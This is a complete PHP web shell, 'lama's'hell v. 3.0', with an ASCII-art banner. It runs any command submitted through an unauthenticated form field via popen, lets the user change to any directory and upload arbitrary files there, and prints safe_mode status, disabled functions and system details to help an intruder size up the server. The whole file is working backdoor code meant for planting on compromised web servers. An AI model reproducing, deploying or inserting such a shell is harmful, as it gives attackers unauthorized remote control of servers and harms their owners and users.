<?
if($_POST['dir'] == "") {

 $curdir = `pwd`;
} else {
 $curdir = $_POST['dir'];
}

if($_POST['king'] == "") {

 $curcmd = "ls -lah";
} else {
 $curcmd = $_POST['king'];
}


?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
                        "http://www.w3.org/TR/html4/loose.dtd">
<html>
  <head>
    <title>lama's'hell v. 3.0</title>
    <style type="text/css">
     body {
      color: white; background-color: black;
      font-size: 12px;
      font-family: Helvetica,Arial,Sans-Serif;
     }
    </style>
  </head>
  <body>
    <pre>
                              _           _
                             / \_______ /|_\
                            /          /_/ \__
                           /             \_/ /
                         _|_              |/|_
                         _|_  O    _    O  _|_
                         _|_      (_)      _|_
                          \                 /
                           _\_____________/_
                          /  \/  (___)  \/  \
                          \__(  o     o  )__/ <?
$ob = @ini_get("open_basedir");
$df = @ini_get("disable_functions");
if( ini_get('safe_mode') ) {
   echo "SM: 1 \\ ";
} else {
   echo "SM: 0 \\ ";
}
if(''==$df) {
   echo "DF: 0 \\ ";
} else {
   echo "DF: ".$df." \\ ";
}
echo "".php_uname()."\n";
?>
<hr></pre>
    <table><form method="post" enctype="multipart/form-data">
      <tr><td><b>Execute command:</b></td><td><input name="king" type="text" size="100" value="<? echo $curcmd; ?>"></td>
      <tr><td><b>Change directory:</b></td><td><input name="dir" type="text" size="100" value="<? echo $curdir; ?>"></td>
      <td><input name="exe" type="submit" value="Execute"></td></tr>

      <tr><td><b>Upload file:</b></td><td><input name="fila" type="file" size="90"></td>
      <td><input name="upl" type="submit" value="Upload"></td></tr>
    </form></table>
<pre><hr>
<?
    if(($_POST['upl']) == "Upload" ) {
    if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir."/".$_FILES['fila']['name'])) {
        echo "The file has been uploaded<br><br>";
    } else {
        echo "There was an error uploading the file, please try again!";
    }
    }
    if(($_POST['exe']) == "Execute") {
     $curcmd = "cd ".$curdir.";".$curcmd;
     $f=popen($curcmd,"r");
     while (!feof($f)) {
      $buffer = fgets($f, 4096);
      $string .= $buffer;
     }
     pclose($f);
     echo htmlspecialchars($string);
    }
?>
    </pre>
  </body>
</html>
